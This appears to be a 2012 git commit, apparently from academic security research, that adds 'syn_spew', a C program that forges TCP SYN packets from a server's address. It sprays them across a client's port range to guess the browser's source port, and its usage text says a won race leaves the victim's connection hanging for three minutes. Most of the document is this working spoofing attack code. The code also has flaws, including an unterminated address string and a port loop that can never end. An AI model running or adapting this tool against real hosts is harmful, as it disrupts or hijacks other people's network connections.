096d3b3a7e604a9ecd616f385a3940835c083d25
Eric Wustrow <ewust@umich.edu>
2012-06-23 04:54:23 -0400

    adding syn_spew: a syn packet maker to be used in conjuction with finding the source port a browser has picked for a remote connection

--- Makefile
+++ Makefile
@@ -1,5 +1,11 @@
 CFLAGS+=-I../forge_socket/ -I/usr/local/include -L/usr/local/lib/
 LDFLAGS+=-levent -levent_core -levent_extra
 
+
+all: syn_spew
+
 server: server.c tcp_spoof.c
+	$(CC) $(CFLAGS) $^ -o $@ $(LDFLAGS)
+
+syn_spew: syn_spew.c tcp_spoof.c
 	$(CC) $(CFLAGS) $^ -o $@ $(LDFLAGS)
---
+++ syn_spew.c
@@ -0,0 +1,171 @@
+#include "tcp_spoof.h"
+#include <unistd.h>
+#include <getopt.h>
+
+int get_low_port(char *s)
+{
+    return atoi(s); 
+}
+
+int get_high_port(char *s)
+{
+    char *high_port = strchr(s, (int)'-');
+    if (high_port == NULL) {
+        return atoi(s);
+    }
+
+    return atoi(high_port+1);
+}
+
+char *get_addr(char *addr_port)
+{
+    char *colon = strchr(addr_port, (int)':');
+    if (colon == NULL) {
+        return addr_port;
+    }
+
+    int addr_len = colon - addr_port;
+    if (addr_len > 15) {
+        return NULL;
+    } 
+
+    char *ret = malloc(addr_len);
+    if (ret == NULL) {
+        return ret;
+    }
+
+    memcpy(ret, addr_port, addr_len);
+
+    return ret; 
+}
+
+int get_port(char *addr_port)
+{
+    char *colon = strchr(addr_port, (int)':');
+    if (colon == NULL) {
+        return -1;
+    }
+
+    return atoi(colon + 1);
+}
+
+int timediff_us(struct timeval *t1, struct timeval *t2)
+{
+    return (t2->tv_sec - t1->tv_sec)*1000000 +
+        (t2->tv_usec - t1->tv_usec);
+}
+
+void delay_until(struct timeval *last_time, int delay)
+{
+    struct timeval cur_time;
+    gettimeofday(&cur_time, NULL);
+    int diff;
+    while ((diff = timediff_us(last_time, &cur_time)) < delay) {
+        if ((delay - diff) > 50) {
+            usleep(delay - diff - 50);
+        }
+        gettimeofday(&cur_time, NULL);
+    }
+    gettimeofday(last_time, NULL);
+}
+
+void print_usage(char *prog)
+{
+    printf("\nUsage: %s [options] client_ip server_ip:server_port\n\n", prog);
+    printf("\tSpoofs SYN packets from server_ip:server_port to client_ip:source_ports,\n");
+    printf("\tin an attempt to guess the port that client has opened.\n");
+    printf("\tIf we win the race against the real server, the clients\n");
+    printf("\tconnection will hang open for 3 minutes.\n\n");
+    printf("Options:\n");
+    printf("    --ports (-p)  : port range to send SYNs over\n");
+    printf("    --delay (-d)  : microseconds to delay between each send\n");
+    printf("\n");
+}
+
+int main(int argc, char *argv[])
+{
+    struct pkt_data pkt;
+    int dport_low, dport_high;
+    struct timeval last_time;
+    int opt; // opt_ind;
+    int opt_index;
+    struct option long_opts[] = {
+        {"ports", 1, 0, 'p'},
+        {"delay", 1, 0, 'd'},
+        {0, 0, 0, 0}
+    };
+    char *daddr;
+    char *saddr_port;
+    char *saddr;
+    int delay = 0;
+    int sport;
+
+    while ((opt = getopt_long(argc, argv, "p:d:", long_opts, &opt_index)) != -1) {
+        switch (opt) {
+        case 'p':
+            dport_low = get_low_port(optarg);
+            dport_high = get_high_port(optarg); 
+            break;
+        case 'd':
+            delay = atoi(optarg);
+            break;
+        default:
+            print_usage(argv[0]);
+        }
+    }
+
+    if (optind+2 != argc) {
+        //usage
+        print_usage(argv[0]);
+        return -1;
+    } 
+
+    daddr = argv[optind++];
+    saddr_port = argv[optind++];   // site_ip:site_port
+
+    saddr = get_addr(saddr_port);
+    sport = get_port(saddr_port);
+
+    /*
+    printf("saddr: [%s]\n", saddr);
+    printf("sport: [%d]\n", sport_low);
+    printf("daddr: [%s]\n", daddr);
+    printf("dport: [%d]\n", dport);
+    */
+ 
+    init_sock();
+
+    pkt.daddr = inet_addr(daddr);
+    pkt.saddr = inet_addr(saddr);
+    pkt.dport = htons(dport_low);
+    pkt.sport = htons(sport); 
+    
+    pkt.id = 1234;
+    pkt.ttl = 64;
+
+    pkt.ack = 0;
+    pkt.seq = 0xa1a2a3a4;
+
+    pkt.flags = TH_SYN;
+    
+    
+    //tcp_forge_xmit(&pkt, NULL, 0);
+    gettimeofday(&last_time, NULL);
+
+    unsigned int percent_done;
+    unsigned int last_pct_done = 0;
+    uint16_t dport;
+
+    for (dport=dport_low; dport <= dport_high; dport++) {
+
+        delay_until(&last_time, delay);
+
+        pkt.dport = htons(dport);   // Victim client's port (our guess)
+
+        if (tcp_forge_xmit(&pkt, NULL, 0)) {
+            fprintf(stderr, "noo\n");
+        }
+    }
+
+    return 0;    
+}
